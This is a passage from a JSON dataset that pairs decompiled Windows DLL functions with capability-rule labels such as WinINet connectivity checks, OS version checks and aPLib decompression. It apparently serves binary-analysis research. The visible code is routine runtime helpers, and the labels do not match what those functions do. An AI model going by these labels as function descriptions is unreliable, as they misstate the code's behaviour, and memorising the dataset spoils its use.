        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.18000cf80(void)\n\n{\n    char acStackX8 [8];\n    ulong var_18h_2;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_20h_2;\n    ulong *var_18h;\n    char *var_10h;\n    ulong *var_bp_8h;\n    \n    acStackX8[0] = '\\x01';\n    var_28h._0_4_ = 0;\n    var_18h = &var_28h;\n    var_20h._0_4_ = 0;\n    var_10h = acStackX8;\n    var_bp_8h = &var_20h;\n    var_20h_2._0_4_ = 8;\n    var_20h_2._4_4_ = 8;\n    fcn.18000cd78(&var_18h_2, &var_20h_2 + 4, &var_18h, &var_20h_2);\n    if (acStackX8[0] != '\\0') {\n        var_20h._0_4_ = var_28h;\n    }\n    return var_20h;\n}\n",
        "token_count": 280
    },
    "18000db8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.18000db8c(char *arg1, uint64_t arg2, ulong arg3, int32_t *arg4)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint uVar6;\n    char *pcVar7;\n    char *pcVar8;\n    int64_t iVar9;\n    bool bVar10;\n    int32_t in_stack_00000028;\n    int32_t in_stack_00000030;\n    \n    if ((arg1 != NULL) && (arg2 != 0)) {\n        *arg1 = '\\0';\n        iVar3 = 0;\n        if (0 < arg3) {\n            iVar3 = arg3;\n        }\n        if (arg2 <= iVar3 + 1) {\n            puVar5 = fcn.18000528c();\n            uVar6 = 0x22;\n            goto code_r0x00018000dbb9;\n        }\n        if (arg4 != NULL) {\n            pcVar8 = *(arg4 + 2);\n            pcVar7 = arg1 + 1;\n            *arg1 = '0';\n            for (; 0 < arg3; arg3._0_4_ = arg3 + -1) {\n                cVar2 = *pcVar8;\n                if (cVar2 == '\\0') {\n                    cVar2 = '0';\n                }\n                else {\n                    pcVar8 = pcVar8 + 1;\n                }\n                *pcVar7 = cVar2;\n                pcVar7 = pcVar7 + 1;\n            }\n            *pcVar7 = '\\0';\n            if (arg3 < 0) goto code_r0x00018000dc89;\n            iVar3 = *arg4;\n            if (in_stack_00000030 == 0) {\n                bVar10 = '4' < *pcVar8;\ncode_r0x00018000dc73:\n                bVar10 = bVar10 == false;\ncode_r0x00018000dc75:\n                if (bVar10) goto code_r0x00018000dc89;\n            }\n            else {\n                iVar4 = fcn.18000f3c8();\n                if (iVar4 == 0) {\n                    if (*pcVar8 < '6') {\n                        if (*pcVar8 < '5') goto code_r0x00018000dc89;\n                        if (in_stack_00000028 != 0) {\n                            bVar10 = pcVar8[-1] & 1;\n                            goto code_r0x00018000dc73;\n                        }\n                    }\n                }\n                else {\n                    if (iVar4 == 0x200) {\n                        if (*pcVar8 == '0') goto code_r0x00018000dc89;\n                        bVar10 = iVar3 == 0x2d;\n                        goto code_r0x00018000dc75;\n                    }\n                    if (iVar4 != 0x100) {\n                        bVar10 = false;\n                        goto code_r0x00018000dc73;\n                    }\n                    if ((*pcVar8 == '0') || (iVar3 != 0x2d)) goto code_r0x00018000dc89;\n                }\n            }\n            while( true ) {\n                pcVar7 = pcVar7 + -1;\n                if (*pcVar7 != '9') break;\n                *pcVar7 = '0';\n            }\n            *pcVar7 = *pcVar7 + '\\x01';\ncode_r0x00018000dc89:\n            if (*arg1 == '1') {\n                arg4[1] = arg4[1] + 1;\n            }\n            else {\n                iVar1 = -1;\n                do {\n                    iVar9 = iVar1;\n                    iVar1 = iVar9 + 1;\n                } while (arg1[iVar9 + 2] != '\\0');\n                fcn.180004b80(arg1, arg1 + 1, iVar9 + 2);\n            }\n            return 0;\n        }\n    }\n    puVar5 = fcn.18000528c();\n    uVar6 = 0x16;\ncode_r0x00018000dbb9:\n    *puVar5 = uVar6;\n    fcn.18000516c();\n    return uVar6;\n}\n",
        "token_count": 949
    },
    "18001027": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t * fcn.180010278(uint8_t *arg1, uint8_t *arg2)\n\n{\n    uint *puVar1;\n    uint8_t *puVar2;\n    int64_t aiStack40 [2];\n    int64_t iStack24;\n    char cStack16;\n    \n    if ((arg1 == NULL) || (arg2 == NULL)) {\n        puVar1 = fcn.18000528c();\n        *puVar1 = 0x16;\n        fcn.18000516c();\n    }\n    else if (arg1 < arg2) {\n        fcn.1800052f0(aiStack40, 0);\n        puVar2 = arg2 + -1;\n        if (*(iStack24 + 8) != 0) {\n            do {\n                puVar2 = puVar2 + -1;\n                if (puVar2 < arg1) break;\n            } while ((*(*puVar2 + 0x19 + iStack24) & 4) != 0);\n            puVar2 = arg2 + (-1 - (arg2 - puVar2 & 1));\n        }\n        if (cStack16 == '\\0') {\n            return puVar2;\n        }\n        *(aiStack40[0] + 0x3a8) = *(aiStack40[0] + 0x3a8) & 0xfffffffd;\n        return puVar2;\n    }\n    return NULL;\n}\n",
        "token_count": 318
    },
    "180011f9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.180011f9c(ulong arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint64_t arg1_00;\n    uint32_t uVar3;\n    \n    uVar1 = fcn.180012930();\n    uVar3 = uVar1 >> 3 & 0x10;\n    uVar2 = uVar3 | 8;\n    if ((uVar1 & 0x200) == 0) {\n        uVar2 = uVar3;\n    }\n    uVar3 = uVar2 | 4;\n    if ((uVar1 & 0x400) == 0) {\n        uVar3 = uVar2;\n    }\n    uVar2 = uVar3 | 2;\n    if ((uVar1 & 0x800) == 0) {\n        uVar2 = uVar3;\n    }\n    uVar3 = uVar2 | 1;\n    if ((uVar1 & 0x1000) == 0) {\n        uVar3 = uVar2;\n    }\n    uVar2 = uVar3 | 0x80000;\n    if ((uVar1 & 0x100) == 0) {\n        uVar2 = uVar3;\n    }\n    uVar3 = uVar1 & 0x6000;\n    if (uVar3 != 0) {\n        if (uVar3 == 0x2000) {\n            uVar2 = uVar2 | 0x100;\n        }\n        else if (uVar3 == 0x4000) {\n            uVar2 = uVar2 | 0x200;\n        }\n        else if (uVar3 == 0x6000) {\n            uVar2 = uVar2 | 0x300;\n        }\n    }\n    uVar1 = uVar1 & 0x8040;\n    if (uVar1 == 0x40) {\n        uVar2 = uVar2 | 0x2000000;\n    }\n    else if (uVar1 == 0x8000) {\n        uVar2 = uVar2 | 0x3000000;\n    }\n    else if (uVar1 == 0x8040) {\n        uVar2 = uVar2 | 0x1000000;\n    }\n    uVar1 = ~(arg2 & 0x308031f) & uVar2 | arg1 & arg2 & 0x308031f;\n    if (uVar1 != uVar2) {\n        uVar3 = (uVar1 & 0x10) << 3;\n        uVar2 = uVar3 | 0x200;\n        if ((uVar1 & 8) == 0) {\n            uVar2 = uVar3;\n        }\n        uVar3 = uVar2 | 0x400;\n        if ((uVar1 & 4) == 0) {\n            uVar3 = uVar2;\n        }\n        uVar2 = uVar3 | 0x800;\n        if ((uVar1 & 2) == 0) {\n            uVar2 = uVar3;\n        }\n        uVar3 = uVar2 | 0x1000;\n        if ((uVar1 & 1) == 0) {\n            uVar3 = uVar2;\n        }\n        uVar2 = uVar3 | 0x100;\n        if ((uVar1 & 0x80000) == 0) {\n            uVar2 = uVar3;\n        }\n        arg1_00 = uVar2;\n        uVar3 = uVar1 & 0x300;\n        if (uVar3 != 0) {\n            if (uVar3 == 0x100) {\n                arg1_00 = uVar2 | 0x2000;\n            }\n            else if (uVar3 == 0x200) {\n                arg1_00 = uVar2 | 0x4000;\n            }\n            else if (uVar3 == 0x300) {\n                arg1_00 = uVar2 | 0x6000;\n            }\n        }\n        uVar1 = uVar1 & 0x3000000;\n        uVar2 = arg1_00;\n        if (uVar1 == 0x1000000) {\n            arg1_00 = uVar2 | 0x8040;\n        }\n        else if (uVar1 == 0x2000000) {\n            arg1_00 = uVar2 | 0x40;\n        }\n        else if (uVar1 == 0x3000000) {\n            arg1_00 = uVar2 | 0x8000;\n        }\n        if ((*0x18001f9d0 == '\\0') || ((arg1_00 & 0x40) == 0)) {\n            arg1_00 = arg1_00 & 0xffffffbf;\n            fcn.180012940(arg1_00);\n        }\n        else {\n            fcn.180012940(arg1_00);\n        }\n        uVar1 = arg1_00 >> 3 & 0x10;\n        uVar2 = uVar1 | 8;\n        if ((arg1_00 & 0x200) == 0) {\n            uVar2 = uVar1;\n        }\n        uVar1 = uVar2 | 4;\n        if ((arg1_00 & 0x400) == 0) {\n            uVar1 = uVar2;\n        }\n        uVar2 = uVar1 | 2;\n        if ((arg1_00 & 0x800) == 0) {\n            uVar2 = uVar1;\n        }\n        uVar1 = uVar2 | 1;\n        if ((arg1_00 & 0x1000) == 0) {\n            uVar1 = uVar2;\n        }\n        uVar2 = uVar1 | 0x80000;\n        if ((arg1_00 & 0x100) == 0) {\n            uVar2 = uVar1;\n        }\n        uVar1 = arg1_00 & 0x6000;\n        if ((arg1_00 & 0x6000) != 0) {\n            if (uVar1 == 0x2000) {\n                uVar2 = uVar2 | 0x100;\n            }\n            else if (uVar1 == 0x4000) {\n                uVar2 = uVar2 | 0x200;\n            }\n            else if (uVar1 == 0x6000) {\n                uVar2 = uVar2 | 0x300;\n            }\n        }\n        uVar1 = arg1_00 & 0x8040;\n        if (uVar1 == 0x40) {\n            uVar2 = uVar2 | 0x2000000;\n        }\n        else if (uVar1 == 0x8000) {\n            uVar2 = uVar2 | 0x3000000;\n        }\n        else if (uVar1 == 0x8040) {\n            uVar2 = uVar2 | 0x1000000;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 1605
    },
    "18001305": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.180013058(uchar (*arg1) [16], ulong arg2)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    char *pcVar6;\n    uchar (*pauVar7) [16];\n    bool bVar8;\n    bool bVar9;\n    char cVar10;\n    char cVar12;\n    char cVar13;\n    char cVar14;\n    uchar auVar11 [16];\n    uchar in_XMM1 [16];\n    uchar auVar15 [16];\n    uint8_t uVar16;\n    \n    pauVar7 = NULL;\n    if (arg2 == 0) {\n        pcVar5 = arg1 & 0xfffffffffffffff0;\n        auVar11 = in_XMM1 & 0x0;\n        cVar10 = SUB161(auVar11 >> 0x40, 0);\n        cVar12 = SUB161(auVar11 >> 0x48, 0);\n        cVar13 = SUB161(auVar11 >> 0x50, 0);\n        cVar14 = SUB161(auVar11 >> 0x58, 0);\n        auVar11 = CONCAT115(-(pcVar5[0xf] == '\\0'), \n                            CONCAT114(-(pcVar5[0xe] == '\\0'), \n                                      CONCAT113(-(pcVar5[0xd] == '\\0'), \n                                                CONCAT112(-(pcVar5[0xc] == '\\0'), \n                                                          CONCAT111(-(pcVar5[0xb] == cVar14), \n                                                                    CONCAT110(-(pcVar5[10] == cVar13), \n                                                                              CONCAT19(-(pcVar5[9] == cVar12), \n                                                                                       CONCAT18(-(pcVar5[8] == cVar10), \n                                                                                                CONCAT17(-(pcVar5[7] ==\n                                                                                                          '\\0'), \n                                                            CONCAT16(-(pcVar5[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar5[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar5[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar5[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar5[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar5[1] == '\\0'), -(*pcVar5 == '\\0'))))))))))))\n                                                         ))));\n        uVar2 = (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                 (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                 (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                 (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                 (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                 (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                 (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                 (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(pcVar5[0xf] == '\\0') >> 7) << 0xf) & -1 << (arg1 & 0xf);\n        pcVar6 = pcVar5;\n        if (uVar2 == 0) {\n            do {\n                pcVar5 = pcVar6 + 0x10;\n                auVar11 = CONCAT115(-(pcVar6[0x1f] == '\\0'), \n                                    CONCAT114(-(pcVar6[0x1e] == '\\0'), \n                                              CONCAT113(-(pcVar6[0x1d] == '\\0'), \n                                                        CONCAT112(-(pcVar6[0x1c] == '\\0'), \n                                                                  CONCAT111(-(pcVar6[0x1b] == cVar14), \n                                                                            CONCAT110(-(pcVar6[0x1a] == cVar13), \n                                                                                      CONCAT19(-(pcVar6[0x19] == cVar12)\n                                                                                               , CONCAT18(-(pcVar6[0x18]\n                                                                                                           == cVar10), \n                                                                                                          CONCAT17(-(\n                                                            pcVar6[0x17] == '\\0'), \n                                                            CONCAT16(-(pcVar6[0x16] == '\\0'), \n                                                                     CONCAT15(-(pcVar6[0x15] == '\\0'), \n                                                                              CONCAT14(-(pcVar6[0x14] == '\\0'), \n                                                                                       CONCAT13(-(pcVar6[0x13] == '\\0')\n                                                                                                , CONCAT12(-(pcVar6[0x12\n                                                            ] == '\\0'), \n                                                            CONCAT11(-(pcVar6[0x11] == '\\0'), -(*pcVar5 == '\\0')))))))))\n                                                            )))))));\n                uVar1 = SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(pcVar6[0x1f] == '\\0') >> 7) << 0xf;\n                uVar2 = uVar1;\n                pcVar6 = pcVar5;\n            } while (uVar1 == 0);\n        }\n        uVar4 = 0;\n        if (uVar2 != 0) {\n            for (; (uVar2 >> uVar4 & 1) == 0; uVar4 = uVar4 + 1) {\n            }\n        }\n        return pcVar5 + uVar4;\n    }\n    if (*0x18001f018 < 2) {\n        pcVar5 = arg1 & 0xfffffffffffffff0;\n        auVar15 = pshuflw(in_XMM1, ZEXT416((arg2 & 0xff) << 8 | arg2 & 0xff), 0);\n        uVar2 = -1 << (arg1 & 0xf);\n        auVar11 = CONCAT115(-(pcVar5[0xf] == '\\0'), \n                            CONCAT114(-(pcVar5[0xe] == '\\0'), \n                                      CONCAT113(-(pcVar5[0xd] == '\\0'), \n                                                CONCAT112(-(pcVar5[0xc] == '\\0'), \n                                                          CONCAT111(-(pcVar5[0xb] == '\\0'), \n                                                                    CONCAT110(-(pcVar5[10] == '\\0'), \n                                                                              CONCAT19(-(pcVar5[9] == '\\0'), \n                                                                                       CONCAT18(-(pcVar5[8] == '\\0'), \n                                                                                                CONCAT17(-(pcVar5[7] ==\n                                                                                                          '\\0'), \n                                                            CONCAT16(-(pcVar5[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar5[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar5[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar5[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar5[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar5[1] == '\\0'), -(*pcVar5 == '\\0'))))))))))))\n                                                         ))));\n        cVar10 = SUB161(auVar15, 0);\n        cVar12 = SUB161(auVar15 >> 8, 0);\n        cVar13 = SUB161(auVar15 >> 0x10, 0);\n        cVar14 = SUB161(auVar15 >> 0x18, 0);\n        auVar15 = CONCAT115(-(cVar14 == pcVar5[0xf]), \n                            CONCAT114(-(cVar13 == pcVar5[0xe]), \n                                      CONCAT113(-(cVar12 == pcVar5[0xd]), \n                                                CONCAT112(-(cVar10 == pcVar5[0xc]), \n                                                          CONCAT111(-(cVar14 == pcVar5[0xb]), \n                                                                    CONCAT110(-(cVar13 == pcVar5[10]), \n                                                                              CONCAT19(-(cVar12 == pcVar5[9]), \n                                                                                       CONCAT18(-(cVar10 == pcVar5[8]), \n                                                                                                CONCAT17(-(cVar14 ==\n                                                                                                          pcVar5[7]), \n                                                                                                         CONCAT16(-(\n                                                            cVar13 == pcVar5[6]), \n                                                            CONCAT15(-(cVar12 == pcVar5[5]), \n                                                                     CONCAT14(-(cVar10 == pcVar5[4]), \n                                                                              CONCAT13(-(cVar14 == pcVar5[3]), \n                                                                                       CONCAT12(-(cVar13 == pcVar5[2]), \n                                                                                                CONCAT11(-(cVar12 ==\n                                                                                                          pcVar5[1]), \n                                                                                                         -(cVar10 ==\n                                                                                                          *pcVar5)))))))\n                                                            )))))))));\n        uVar4 = (SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                 (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                 (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                 (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                 (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                 (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                 (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                 (SUB161(auVar15 >> 0x77, 0) & 1) << 0xe | (-(cVar14 == pcVar5[0xf]) >> 7) << 0xf) & uVar2;\n        uVar2 = (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                 (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                 (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                 (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                 (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                 (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                 (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                 (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(pcVar5[0xf] == '\\0') >> 7) << 0xf) & uVar2;\n        pcVar6 = pcVar5;\n        if (uVar2 == 0) {\n            do {\n                uVar2 = 0x1f;\n                if (uVar4 != 0) {\n                    for (; uVar4 >> uVar2 == 0; uVar2 = uVar2 - 1) {\n                    }\n                }\n                if (uVar4 != 0) {\n                    pauVar7 = pcVar6 + uVar2;\n                }\n                pcVar5 = pcVar6 + 0x10;\n                auVar11 = ZEXT416(CONCAT13(-(pcVar6[0x13] == '\\0'), \n                                           CONCAT12(-(pcVar6[0x12] == '\\0'), \n                                                    CONCAT11(-(pcVar6[0x11] == '\\0'), -(*pcVar5 == '\\0'))))) &\n                          0xffffffffffffffff;\n                uVar16 = -(SUB161(auVar11 >> 0x78, 0) == pcVar6[0x1f]);\n                auVar15 = CONCAT115(uVar16, CONCAT114(-(SUB161(auVar11 >> 0x70, 0) == pcVar6[0x1e]), \n                                                      CONCAT113(-(SUB161(auVar11 >> 0x68, 0) == pcVar6[0x1d]), \n                                                                CONCAT112(-(SUB161(auVar11 >> 0x60, 0) == pcVar6[0x1c])\n                                                                          , CONCAT111(-(SUB161(auVar11 >> 0x58, 0) ==\n                                                                                       pcVar6[0x1b]), \n                                                                                      CONCAT110(-(SUB161(auVar11 >> 0x50\n                                                                                                         , 0) ==\n                                                                                                 pcVar6[0x1a]), \n                                                                                                CONCAT19(-(SUB161(\n                                                            auVar11 >> 0x48, 0) == pcVar6[0x19]), \n                                                            CONCAT18(-(SUB161(auVar11 >> 0x40, 0) == pcVar6[0x18]), \n                                                                     CONCAT17(-(pcVar6[0x17] == '\\0'), \n                                                                              CONCAT16(-(pcVar6[0x16] == '\\0'), \n                                                                                       CONCAT15(-(pcVar6[0x15] == '\\0')\n                                                                                                , CONCAT14(-(pcVar6[0x14\n                                                            ] == '\\0'), SUB164(auVar11, 0)))))))))))));\n                auVar11 = CONCAT115(-(cVar14 == pcVar6[0x1f]), \n                                    CONCAT114(-(cVar13 == pcVar6[0x1e]), \n                                              CONCAT113(-(cVar12 == pcVar6[0x1d]), \n                                                        CONCAT112(-(cVar10 == pcVar6[0x1c]), \n                                                                  CONCAT111(-(cVar14 == pcVar6[0x1b]), \n                                                                            CONCAT110(-(cVar13 == pcVar6[0x1a]), \n                                                                                      CONCAT19(-(cVar12 == pcVar6[0x19])\n                                                                                               , CONCAT18(-(cVar10 ==\n                                                                                                           pcVar6[0x18])\n                                                                                                          , CONCAT17(-(\n                                                            cVar14 == pcVar6[0x17]), \n                                                            CONCAT16(-(cVar13 == pcVar6[0x16]), \n                                                                     CONCAT15(-(cVar12 == pcVar6[0x15]), \n                                                                              CONCAT14(-(cVar10 == pcVar6[0x14]), \n                                                                                       CONCAT13(-(cVar14 == pcVar6[0x13]\n                                                                                                 ), CONCAT12(-(cVar13 ==\n                                                                                                              pcVar6[\n                                                            0x12]), CONCAT11(-(cVar12 == pcVar6[0x11]), \n                                                                             -(cVar10 == *pcVar5))))))))))))))));\n                uVar1 = SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar15 >> 0x77, 0) & 1) << 0xe | (uVar16 >> 7) << 0xf;\n                uVar2 = uVar1;\n                uVar4 = SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(cVar14 == pcVar6[0x1f]) >> 7) << 0xf;\n                pcVar6 = pcVar5;\n            } while (uVar1 == 0);\n        }\n        uVar4 = uVar4 & (-uVar2 & uVar2) - 1;\n        uVar2 = 0x1f;\n        if (uVar4 != 0) {\n            for (; uVar4 >> uVar2 == 0; uVar2 = uVar2 - 1) {\n            }\n        }\n        if (uVar4 != 0) {\n            pauVar7 = pcVar5 + uVar2;\n        }\n    }\n    else {\n        while( true ) {\n            bVar8 = false;\n            bVar9 = (arg1 & 0xf) == 0;\n            if (bVar9) break;\n            if ((*arg1)[0] == arg2) {\n                pauVar7 = arg1;\n            }\n            if ((*arg1)[0] == '\\0') {\n                return pauVar7;\n            }\n            arg1 = *arg1 + 1;\n        }\n        while( true ) {\n            iVar3 = pcmpistri(ZEXT416(arg2 & 0xff), *arg1, 0x40);\n            if (bVar8) {\n                pauVar7 = *arg1 + iVar3;\n                bVar9 = pauVar7 == NULL;\n                pcmpistri(ZEXT416(arg2 & 0xff), *arg1, 0x40);\n            }\n            if (bVar9) break;\n            bVar8 = 0xffffffffffffffef < arg1;\n            arg1 = arg1[1];\n            bVar9 = arg1 == NULL;\n        }\n    }\n    return pauVar7;\n}\n",
        "token_count": 5226
    },
    "18000430": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.180004300(uchar (*arg1) [16], ulong noname_1, uint64_t arg3)\n\n{\n    uchar (*pauVar1) [16];\n    uchar (*pauVar2) [16];\n    uint16_t uVar3;\n    uint64_t uVar5;\n    uchar auVar6 [12];\n    uint32_t uVar4;\n    uchar auVar7 [13];\n    uchar auVar8 [16];\n    uchar uVar9;\n    \n    uVar5 = noname_1 * 0x101010101010101;\n    uVar3 = uVar5;\n    uVar4 = uVar5;\n    if (arg3 < 0x11) {\n        uVar9 = uVar5;\n    // switch table (17 cases) at 0x180025000\n        switch(*(arg3 * 4 + 0x180025000) + 0x180000000) {\n        case 0x180004430:\n            *(arg1[-1] + arg3 + 1) = uVar5;\n        case 0x180004434:\n            *(arg1[-1] + arg3 + 9) = uVar4;\n        case 0x180004437:\n            *(arg1[-1] + arg3 + 0xd) = uVar3;\n        case 0x18000443b:\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x18000443e:\n            return arg1;\n        case 0x180004440:\n            *(arg1[-1] + arg3 + 4) = uVar5;\n        case 0x180004444:\n            *(arg1[-1] + arg3 + 0xc) = uVar4;\n            return arg1;\n        case 0x180004448:\n            *(arg1[-1] + arg3 + 7) = uVar5;\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x180004450:\n            *(arg1[-1] + arg3 + 3) = uVar5;\n        case 0x180004454:\n            *(arg1[-1] + arg3 + 0xb) = uVar4;\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x180004460:\n            *(arg1[-1] + arg3 + 2) = uVar5;\n        case 0x180004464:\n            *(arg1[-1] + arg3 + 10) = uVar4;\n        case 0x180004467:\n            *(arg1[-1] + arg3 + 0xe) = uVar3;\n            return arg1;\n        case 0x18000446c:\n            **arg1 = uVar5;\n            return arg1;\n        case 0x180004470:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar3;\n            (*arg1)[10] = uVar9;\n            return arg1;\n        case 0x180004480:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar3;\n            return arg1;\n        case 0x180004488:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar5;\n            return arg1;\n        }\n    }\n    uVar9 = SUB141(ZEXT814(uVar5) >> 0x30, 0);\n    auVar7 = ZEXT813(uVar5);\n    auVar6 = ZEXT812(uVar5);\n    auVar8 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(SUB1610(CONCAT97(SUB169(\n                                                            CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(SUB166(CONCAT511(\n                                                            SUB165(CONCAT412(SUB164(CONCAT313(SUB163(CONCAT214(SUB162(\n                                                            